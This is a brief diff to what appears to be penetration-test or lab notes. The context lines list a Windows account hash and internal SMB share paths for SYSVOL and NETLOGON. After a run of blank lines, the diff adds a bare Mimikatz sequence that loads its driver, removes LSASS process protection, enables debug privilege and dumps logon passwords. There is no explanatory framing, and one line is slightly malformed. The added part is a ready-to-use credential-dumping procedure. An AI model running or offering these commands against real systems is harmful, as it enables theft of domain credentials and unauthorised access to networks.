@@ -178,3 +178,25 @@ DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c0
 smb://10.201.52.15/SYSVOL/
 smb://10.201.52.15/NETLOGON/
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+cd C:\Tools\Mimikatz\mimikatz.exe
+!+
+!processprotect /process:lsass.exe /remove
+privilege::debug
+sekurlsa::logonpasswords
